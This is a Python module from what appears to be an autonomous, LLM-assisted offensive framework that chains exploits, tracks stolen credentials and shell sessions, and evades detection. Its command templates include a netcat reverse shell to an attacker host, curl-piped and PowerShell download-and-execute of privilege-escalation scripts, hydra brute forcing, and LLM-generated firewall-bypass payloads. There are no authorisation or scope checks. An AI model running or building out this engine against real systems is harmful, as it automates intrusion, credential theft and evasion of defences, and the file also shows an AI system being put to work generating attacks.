"""
Exploit Chainer - Phase 3

Orchestrates multi-step attack sequences:
- Chains exploits together (SQLi → File Upload → Shell)
- Manages state between steps
- Handles failures with automatic fallbacks
- Tracks sessions and credentials across steps
- Provides real-time execution feedback

This is the "execution engine" that runs attack plans created by StrategicPlanner.

Integration:
- strategic_planner.py: Receives AttackPlans to execute
- exploit_executor.py: Executes individual steps
- llm_generator.py: Generates custom payloads when needed
- autonomous_agent.py: Main integration point

Architecture:
    ┌─────────────────────────────────────────────────────────┐
    │                    ExploitChainer                        │
    │  ┌─────────────┐  ┌─────────────┐  ┌─────────────────┐  │
    │  │ SessionMgr  │  │ StateMachine│  │ FallbackHandler │  │
    │  └─────────────┘  └─────────────┘  └─────────────────┘  │
    └─────────────────────────────────────────────────────────┘
                              │
                              ▼
    ┌─────────────────────────────────────────────────────────┐
    │                  Step Execution Loop                     │
    │  1. Get next step from plan                             │
    │  2. Prepare context (inject creds, sessions)            │
    │  3. Execute via ExploitExecutor                         │
    │  4. Parse results, update state                         │
    │  5. Handle failure → try fallback or adapt              │
    │  6. Repeat until objective achieved                     │
    └─────────────────────────────────────────────────────────┘
"""

import asyncio
import json
import logging
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Dict, List, Any, Optional, Callable, Tuple

logger = logging.getLogger(__name__)


class ChainStatus(Enum):
    """Status of exploit chain execution"""
    PENDING = "pending"
    RUNNING = "running"
    PAUSED = "paused"
    SUCCESS = "success"
    PARTIAL = "partial"  # Some objectives achieved
    FAILED = "failed"
    ABORTED = "aborted"


class SessionType(Enum):
    """Types of sessions that can be established"""
    SHELL = "shell"
    WEBSHELL = "webshell"
    METERPRETER = "meterpreter"
    SSH = "ssh"
    RDP = "rdp"
    DATABASE = "database"
    API = "api"


@dataclass
class Session:
    """Represents an established session"""
    session_id: str
    session_type: SessionType
    target: str
    port: int = 0
    username: str = ""
    access_level: str = "user"  # user, admin, root, system
    established_at: str = ""
    last_active: str = ""
    is_active: bool = True
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    def __post_init__(self):
        if not self.established_at:
            self.established_at = datetime.now().isoformat()
        self.last_active = self.established_at
    
    def touch(self):
        """Update last active time"""
        self.last_active = datetime.now().isoformat()
    
    def to_dict(self) -> Dict:
        return {
            "session_id": self.session_id,
            "session_type": self.session_type.value,
            "target": self.target,
            "port": self.port,
            "username": self.username,
            "access_level": self.access_level,
            "established_at": self.established_at,
            "last_active": self.last_active,
            "is_active": self.is_active,
            "metadata": self.metadata,
        }


@dataclass
class Credential:
    """Discovered credential"""
    username: str
    password: str = ""
    hash: str = ""
    credential_type: str = "password"  # password, hash, key, token
    source: str = ""  # Where it was found
    verified: bool = False
    services: List[str] = field(default_factory=list)  # Services it works on
    
    def to_dict(self) -> Dict:
        return {
            "username": self.username,
            "password": self.password[:3] + "***" if self.password else "",
            "hash": self.hash[:20] + "..." if self.hash else "",
            "credential_type": self.credential_type,
            "source": self.source,
            "verified": self.verified,
            "services": self.services,
        }


@dataclass 
class ChainState:
    """Current state of exploit chain execution"""
    chain_id: str
    target: str
    objective: str
    status: ChainStatus = ChainStatus.PENDING
    current_step_index: int = 0
    steps_completed: int = 0
    steps_failed: int = 0
    sessions: List[Session] = field(default_factory=list)
    credentials: List[Credential] = field(default_factory=list)
    extracted_data: Dict[str, Any] = field(default_factory=dict)
    environment: Dict[str, str] = field(default_factory=dict)  # Discovered env info
    started_at: str = ""
    completed_at: str = ""
    execution_log: List[Dict] = field(default_factory=list)
    
    def __post_init__(self):
        if not self.started_at:
            self.started_at = datetime.now().isoformat()
    
    def add_session(self, session: Session):
        """Add a new session"""
        self.sessions.append(session)
        self.log_event("session_established", {
            "session_id": session.session_id,
            "type": session.session_type.value,
            "access_level": session.access_level,
        })
    
    def add_credential(self, credential: Credential):
        """Add discovered credential"""
        # Check for duplicates
        for existing in self.credentials:
            if existing.username == credential.username and existing.password == credential.password:
                return
        self.credentials.append(credential)
        self.log_event("credential_found", {
            "username": credential.username,
            "type": credential.credential_type,
        })
    
    def get_active_sessions(self, session_type: SessionType = None) -> List[Session]:
        """Get active sessions, optionally filtered by type"""
        sessions = [s for s in self.sessions if s.is_active]
        if session_type:
            sessions = [s for s in sessions if s.session_type == session_type]
        return sessions
    
    def get_best_session(self) -> Optional[Session]:
        """Get highest-privilege active session"""
        active = self.get_active_sessions()
        if not active:
            return None
        
        # Priority: root > admin > user
        priority = {"root": 3, "system": 3, "admin": 2, "administrator": 2, "user": 1}
        return max(active, key=lambda s: priority.get(s.access_level.lower(), 0))
    
    def has_root(self) -> bool:
        """Check if we have root/system access"""
        return any(
            s.access_level.lower() in ["root", "system", "administrator"]
            for s in self.get_active_sessions()
        )
    
    def log_event(self, event_type: str, data: Dict = None):
        """Log an execution event"""
        self.execution_log.append({
            "timestamp": datetime.now().isoformat(),
            "event": event_type,
            "data": data or {},
        })
    
    def to_dict(self) -> Dict:
        return {
            "chain_id": self.chain_id,
            "target": self.target,
            "objective": self.objective,
            "status": self.status.value,
            "current_step_index": self.current_step_index,
            "steps_completed": self.steps_completed,
            "steps_failed": self.steps_failed,
            "sessions": [s.to_dict() for s in self.sessions],
            "credentials": [c.to_dict() for c in self.credentials],
            "extracted_data": self.extracted_data,
            "environment": self.environment,
            "started_at": self.started_at,
            "completed_at": self.completed_at,
            "has_root": self.has_root(),
            "execution_log_count": len(self.execution_log),
        }


@dataclass
class StepResult:
    """Result of executing a single step"""
    step_id: str
    success: bool
    output: str = ""
    session_obtained: Optional[Session] = None
    credentials_found: List[Credential] = field(default_factory=list)
    data_extracted: Dict[str, Any] = field(default_factory=dict)
    error: str = ""
    execution_time: float = 0
    next_step_hint: str = ""  # Suggestion for next step
    
    def to_dict(self) -> Dict:
        return {
            "step_id": self.step_id,
            "success": self.success,
            "output": self.output[:500] if self.output else "",
            "session_obtained": self.session_obtained.to_dict() if self.session_obtained else None,
            "credentials_found": len(self.credentials_found),
            "data_extracted": list(self.data_extracted.keys()),
            "error": self.error,
            "execution_time": self.execution_time,
        }


class ExploitChainer:
    """
    Orchestrates multi-step exploit chains.
    
    Capabilities:
    - Execute attack plans step by step
    - Maintain state across steps (sessions, creds, data)
    - Handle failures with automatic fallbacks
    - Adapt attacks based on discovered information
    - Provide real-time execution callbacks
    
    Usage:
        chainer = ExploitChainer(executor, llm_generator)
        
        # Execute a plan
        state = await chainer.execute_plan(
            plan=attack_plan,
            context={'lhost': '10.10.14.1', 'lport': 4444},
            on_step_complete=callback_fn
        )
        
        if state.has_root():
            print("Got root!")
    """
    
    def __init__(
        self,
        executor=None,
        llm_generator=None,
        tool_manager=None
    ):
        """
        Initialize ExploitChainer.
        
        Args:
            executor: ExploitExecutor instance
            llm_generator: LLMExploitGenerator for dynamic payloads
            tool_manager: ToolManager for command execution
        """
        self.executor = executor
        self.llm_generator = llm_generator
        self.tool_manager = tool_manager
        
        self._init_components()
        
        # Active chains
        self.active_chains: Dict[str, ChainState] = {}
        
        # Execution callbacks
        self.callbacks: Dict[str, List[Callable]] = {
            "step_start": [],
            "step_complete": [],
            "session_established": [],
            "credential_found": [],
            "chain_complete": [],
            "chain_failed": [],
        }
        
        logger.info("[ExploitChainer] Initialized")
    
    def _init_components(self):
        """Initialize required components"""
        if self.executor is None:
            try:
                from .exploit_executor import get_exploit_executor
                self.executor = get_exploit_executor(self.tool_manager)
            except ImportError:
                logger.warning("[ExploitChainer] ExploitExecutor not available")
        
        if self.llm_generator is None:
            try:
                from .llm_generator import get_llm_exploit_generator
                self.llm_generator = get_llm_exploit_generator()
            except ImportError:
                logger.warning("[ExploitChainer] LLMExploitGenerator not available")
    
    def register_callback(self, event: str, callback: Callable):
        """Register callback for execution events"""
        if event in self.callbacks:
            self.callbacks[event].append(callback)
    
    def _emit_event(self, event: str, data: Any):
        """Emit event to registered callbacks"""
        for callback in self.callbacks.get(event, []):
            try:
                callback(data)
            except Exception as e:
                logger.error(f"[ExploitChainer] Callback error: {e}")
    
    async def execute_plan(
        self,
        plan: 'AttackPlan',
        context: Dict[str, Any],
        on_step_complete: Callable = None,
        max_retries: int = 2,
        abort_on_detection: bool = True
    ) -> ChainState:
        """
        Execute an attack plan.
        
        Args:
            plan: AttackPlan from StrategicPlanner
            context: Execution context (lhost, lport, etc.)
            on_step_complete: Callback for each step
            max_retries: Max retries per step
            abort_on_detection: Abort if detected by defenses
            
        Returns:
            ChainState with execution results
        """
        # Initialize chain state
        chain_id = str(uuid.uuid4())[:8]
        state = ChainState(
            chain_id=chain_id,
            target=plan.target,
            objective=plan.final_objective,
        )
        self.active_chains[chain_id] = state
        
        state.status = ChainStatus.RUNNING
        state.log_event("chain_started", {"plan_id": plan.plan_id, "steps": len(plan.steps)})
        
        logger.info(f"[ExploitChainer] Starting chain {chain_id} with {len(plan.steps)} steps")
        
        try:
            # Execute steps
            for i, step in enumerate(plan.steps):
                state.current_step_index = i
                
                # Check if objective already achieved
                if self._objective_achieved(state, plan.final_objective):
                    logger.info(f"[ExploitChainer] Objective achieved early at step {i}")
                    break
                
                # Check dependencies
                if not self._dependencies_met(step, plan, state):
                    state.log_event("step_skipped", {"step_id": step.step_id, "reason": "dependencies_not_met"})
                    continue
                
                # Emit step start
                self._emit_event("step_start", {"step": step, "state": state})
                
                # Execute step with retries
                result = await self._execute_step_with_retry(
                    step=step,
                    context=context,
                    state=state,
                    max_retries=max_retries
                )
                
                # Process result
                self._process_step_result(result, state)
                
                # Mark step status in plan
                plan.mark_step_complete(step.step_id, result.success, result.to_dict())
                
                # Emit step complete
                self._emit_event("step_complete", {"step": step, "result": result, "state": state})
                if on_step_complete:
                    on_step_complete(step, result, state)
                
                # Check for detection
                if abort_on_detection and self._is_detected(result):
                    logger.warning("[ExploitChainer] Detection suspected, aborting")
                    state.status = ChainStatus.ABORTED
                    state.log_event("chain_aborted", {"reason": "detection_suspected"})
                    break
                
                # Handle failure
                if not result.success:
                    state.steps_failed += 1
                    
                    # Try fallback
                    fallback = plan.get_fallback_for_step(step)
                    if fallback:
                        logger.info(f"[ExploitChainer] Trying fallback: {fallback.name}")
                        fallback_result = await self._execute_step_with_retry(
                            step=fallback,
                            context=context,
                            state=state,
                            max_retries=1
                        )
                        if fallback_result.success:
                            self._process_step_result(fallback_result, state)
                else:
                    state.steps_completed += 1
            
            # Determine final status
            if self._objective_achieved(state, plan.final_objective):
                state.status = ChainStatus.SUCCESS
                self._emit_event("chain_complete", state)
            elif state.steps_completed > 0:
                state.status = ChainStatus.PARTIAL
            elif state.status != ChainStatus.ABORTED:
                state.status = ChainStatus.FAILED
                self._emit_event("chain_failed", state)
            
        except Exception as e:
            logger.error(f"[ExploitChainer] Chain execution error: {e}")
            state.status = ChainStatus.FAILED
            state.log_event("chain_error", {"error": str(e)})
        
        state.completed_at = datetime.now().isoformat()
        state.log_event("chain_completed", {"status": state.status.value})
        
        return state
    
    async def _execute_step_with_retry(
        self,
        step: 'AttackStep',
        context: Dict[str, Any],
        state: ChainState,
        max_retries: int
    ) -> StepResult:
        """Execute a step with retries and adaptation"""
        
        last_result = None
        
        for attempt in range(max_retries + 1):
            # Enrich context with current state
            enriched_context = self._enrich_context(context, state)
            
            # Build command for step
            command = self._build_step_command(step, enriched_context, state)
            
            if not command:
                return StepResult(
                    step_id=step.step_id,
                    success=False,
                    error="Could not build command for step"
                )
            
            state.log_event("step_attempt", {
                "step_id": step.step_id,
                "attempt": attempt + 1,
                "command": command[:100] + "..." if len(command) > 100 else command
            })
            
            # Execute
            start_time = time.time()
            exec_result = await self.executor.execute_command(
                command=command,
                exploit_id=step.step_id,
                success_indicators=step.success_conditions,
                failure_indicators=step.failure_conditions,
                timeout=step.estimated_time
            )
            execution_time = time.time() - start_time
            
            # Parse result
            result = self._parse_execution_result(exec_result, step, execution_time)
            last_result = result
            
            if result.success:
                return result
            
            # Adapt for next attempt
            if attempt < max_retries:
                logger.info(f"[ExploitChainer] Step failed, adapting for retry {attempt + 2}")
                step = self._adapt_step_for_retry(step, result, state)
                await asyncio.sleep(1)  # Brief pause between retries
        
        return last_result or StepResult(step_id=step.step_id, success=False, error="All retries failed")
    
    def _enrich_context(self, context: Dict, state: ChainState) -> Dict:
        """Enrich context with discovered information"""
        enriched = context.copy()
        
        # Add credentials if available
        if state.credentials:
            cred = state.credentials[0]  # Use first credential
            enriched['username'] = cred.username
            enriched['password'] = cred.password
        
        # Add session info
        best_session = state.get_best_session()
        if best_session:
            enriched['session'] = best_session.to_dict()
            enriched['access_level'] = best_session.access_level
        
        # Add discovered environment info
        enriched.update(state.environment)
        
        # Add extracted data references
        enriched['extracted_data'] = state.extracted_data
        
        return enriched
    
    def _build_step_command(
        self,
        step: 'AttackStep',
        context: Dict,
        state: ChainState
    ) -> str:
        """Build command for a step"""
        
        # If step has explicit command, use it (with variable substitution)
        if step.command:
            return self._substitute_variables(step.command, context)
        
        # If step has payload, wrap in appropriate command
        if step.payload:
            return self._wrap_payload(step.payload, step.tool, context)
        
        # Generate command based on tool and objective
        return self._generate_tool_command(step, context, state)
    
    def _substitute_variables(self, command: str, context: Dict) -> str:
        """Substitute variables in command template"""
        result = command
        
        # Common substitutions
        substitutions = {
            '{target}': context.get('target', ''),
            '{url}': context.get('url', context.get('target', '')),
            '{host}': context.get('host', ''),
            '{port}': str(context.get('port', 80)),
            '{lhost}': context.get('lhost', '10.10.14.1'),
            '{lport}': str(context.get('lport', 4444)),
            '{username}': context.get('username', 'admin'),
            '{password}': context.get('password', 'password'),
            '{wordlist}': context.get('wordlist', '/usr/share/wordlists/rockyou.txt'),
        }
        
        for var, value in substitutions.items():
            result = result.replace(var, value)
        
        return result
    
    def _wrap_payload(self, payload: str, tool: str, context: Dict) -> str:
        """Wrap payload in tool command"""
        target = context.get('target', '')
        
        wrappers = {
            'curl': f"curl -s '{target}' -d '{payload}'",
            'wget': f"wget -q -O- '{target}' --post-data='{payload}'",
            'sqlmap': f"sqlmap -u '{target}' --data='{payload}' --batch",
            'bash': payload,  # Direct execution
            'python': f"python3 -c \"{payload}\"",
        }
        
        return wrappers.get(tool.lower(), payload)
    
    def _generate_tool_command(
        self,
        step: 'AttackStep',
        context: Dict,
        state: ChainState
    ) -> str:
        """Generate command based on tool and context"""
        tool = step.tool.lower()
        target = context.get('target', '')
        
        # Tool command templates
        templates = {
            'sqlmap': f"sqlmap -u '{target}' --batch --dbs --level=3 --risk=2",
            'nikto': f"nikto -h {target} -Format txt",
            'dalfox': f"dalfox url '{target}' --silence --only-poc",
            'nuclei': f"nuclei -u '{target}' -silent -severity critical,high",
            'hydra': self._build_hydra_command(context, state),
            'gobuster': f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -q",
            'ffuf': f"ffuf -u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302",
            'nc': f"nc -e /bin/sh {context.get('lhost', '10.10.14.1')} {context.get('lport', 4444)}",
            'nmap': f"nmap -sV -sC {target.replace('http://', '').replace('https://', '').split('/')[0]}",
            'linpeas': "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            'winpeas': "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe')\"",
        }
        
        command = templates.get(tool, '')
        
        # If no template and LLM available, try generating
        if not command and self.llm_generator and self.llm_generator.is_available():
            command = self._llm_generate_command(step, context)
        
        return command
    
    def _build_hydra_command(self, context: Dict, state: ChainState) -> str:
        """Build Hydra command using discovered credentials"""
        target = context.get('target', '').replace('http://', '').replace('https://', '').split('/')[0]
        
        # Use discovered username if available
        if state.credentials:
            usernames = [c.username for c in state.credentials[:5]]
            user_opt = f"-L /tmp/users.txt"  # Would need to write file
        else:
            user_opt = "-l admin"
        
        return f"hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/passwords.txt {target} http-post-form"
    
    def _llm_generate_command(self, step: 'AttackStep', context: Dict) -> str:
        """Use LLM to generate command"""
        try:
            result = self.llm_generator.generate_custom_payload(
                payload_type=step.tool,
                context=context,
                requirements=[step.description, f"Objective: {step.objective.value}"]
            )
            if result:
                return result.code
        except Exception as e:
            logger.warning(f"[ExploitChainer] LLM command generation failed: {e}")
        return ""
    
    def _parse_execution_result(
        self,
        exec_result: 'ExploitResult',
        step: 'AttackStep',
        execution_time: float
    ) -> StepResult:
        """Parse ExploitResult into StepResult"""
        
        result = StepResult(
            step_id=step.step_id,
            success=exec_result.is_success,
            output=exec_result.output,
            error=exec_result.error_message,
            execution_time=execution_time,
        )
        
        # Check for shell
        if exec_result.shell_obtained:
            result.session_obtained = Session(
                session_id=str(uuid.uuid4())[:8],
                session_type=SessionType.SHELL,
                target=step.name,
                access_level=self._detect_access_level(exec_result.output)
            )
        
        # Extract credentials
        for cred_dict in exec_result.credentials_found:
            result.credentials_found.append(Credential(
                username=cred_dict.get('username', ''),
                password=cred_dict.get('password', ''),
                hash=cred_dict.get('hash', ''),
                credential_type=cred_dict.get('type', 'password'),
                source=step.name
            ))
        
        # Extract data
        result.data_extracted = exec_result.extracted_data
        
        return result
    
    def _detect_access_level(self, output: str) -> str:
        """Detect access level from command output"""
        output_lower = output.lower()
        
        if 'uid=0' in output_lower or 'root' in output_lower:
            return 'root'
        elif 'administrator' in output_lower or 'system' in output_lower:
            return 'system'
        elif 'admin' in output_lower:
            return 'admin'
        else:
            return 'user'
    
    def _process_step_result(self, result: StepResult, state: ChainState):
        """Process step result and update chain state"""
        
        # Add session
        if result.session_obtained:
            state.add_session(result.session_obtained)
            self._emit_event("session_established", result.session_obtained)
        
        # Add credentials
        for cred in result.credentials_found:
            state.add_credential(cred)
            self._emit_event("credential_found", cred)
        
        # Merge extracted data
        state.extracted_data.update(result.data_extracted)
        
        # Update environment info
        if 'os' in result.data_extracted:
            state.environment['os'] = result.data_extracted['os']
        if 'kernel' in result.data_extracted:
            state.environment['kernel'] = result.data_extracted['kernel']
    
    def _dependencies_met(
        self,
        step: 'AttackStep',
        plan: 'AttackPlan',
        state: ChainState
    ) -> bool:
        """Check if step dependencies are met"""
        if not step.dependencies:
            return True
        
        completed_ids = {
            s.step_id for s in plan.steps
            if s.status.value == 'success'
        }
        
        return all(dep in completed_ids for dep in step.dependencies)
    
    def _objective_achieved(self, state: ChainState, objective: str) -> bool:
        """Check if the chain objective has been achieved"""
        objective_lower = objective.lower()
        
        if 'shell' in objective_lower or 'access' in objective_lower:
            return len(state.get_active_sessions()) > 0
        
        if 'root' in objective_lower or 'admin' in objective_lower:
            return state.has_root()
        
        if 'credential' in objective_lower or 'password' in objective_lower:
            return len(state.credentials) > 0
        
        if 'data' in objective_lower or 'exfil' in objective_lower:
            return bool(state.extracted_data)
        
        if 'persistence' in objective_lower:
            # Would need specific persistence check
            return False
        
        return False
    
    def _is_detected(self, result: StepResult) -> bool:
        """Check if we might have been detected"""
        detection_indicators = [
            'blocked', 'denied', 'forbidden', 'firewall',
            'ids', 'ips', 'detected', 'banned', 'blacklist'
        ]
        
        output_lower = result.output.lower() if result.output else ''
        error_lower = result.error.lower() if result.error else ''
        
        return any(
            indicator in output_lower or indicator in error_lower
            for indicator in detection_indicators
        )
    
    def _adapt_step_for_retry(
        self,
        step: 'AttackStep',
        failed_result: StepResult,
        state: ChainState
    ) -> 'AttackStep':
        """Adapt step for retry based on failure"""
        
        # Create modified step
        from copy import deepcopy
        adapted = deepcopy(step)
        adapted.step_id = f"{step.step_id}_retry"
        
        # If blocked, try with encoding/evasion
        if 'blocked' in failed_result.error.lower() or 'forbidden' in failed_result.output.lower():
            if self.llm_generator and self.llm_generator.is_available():
                # Generate WAF bypass variant
                bypass_result = self.llm_generator.adapt_payload_for_waf(
                    original_payload=step.payload or step.command,
                    waf_type="generic",
                    failed_attempts=[step.command]
                )
                if bypass_result:
                    adapted.command = bypass_result.code.split('\n')[0]
        
        # If timeout, reduce payload complexity
        elif 'timeout' in failed_result.error.lower():
            adapted.estimated_time = step.estimated_time * 2
        
        return adapted
    
    def get_chain_state(self, chain_id: str) -> Optional[ChainState]:
        """Get state of a chain by ID"""
        return self.active_chains.get(chain_id)
    
    def abort_chain(self, chain_id: str) -> bool:
        """Abort a running chain"""
        state = self.active_chains.get(chain_id)
        if state and state.status == ChainStatus.RUNNING:
            state.status = ChainStatus.ABORTED
            state.log_event("chain_aborted", {"reason": "user_requested"})
            return True
        return False
    
    def get_stats(self) -> Dict[str, Any]:
        """Get chainer statistics"""
        chains = list(self.active_chains.values())
        
        return {
            "total_chains": len(chains),
            "chains_by_status": {
                status.value: sum(1 for c in chains if c.status == status)
                for status in ChainStatus
            },
            "total_sessions": sum(len(c.sessions) for c in chains),
            "total_credentials": sum(len(c.credentials) for c in chains),
            "success_rate": (
                sum(1 for c in chains if c.status == ChainStatus.SUCCESS) / len(chains)
                if chains else 0
            ),
        }


# Singleton instance
_exploit_chainer: Optional[ExploitChainer] = None


def get_exploit_chainer(
    executor=None,
    llm_generator=None,
    tool_manager=None
) -> ExploitChainer:
    """Get singleton ExploitChainer instance"""
    global _exploit_chainer
    if _exploit_chainer is None:
        _exploit_chainer = ExploitChainer(executor, llm_generator, tool_manager)
    return _exploit_chainer
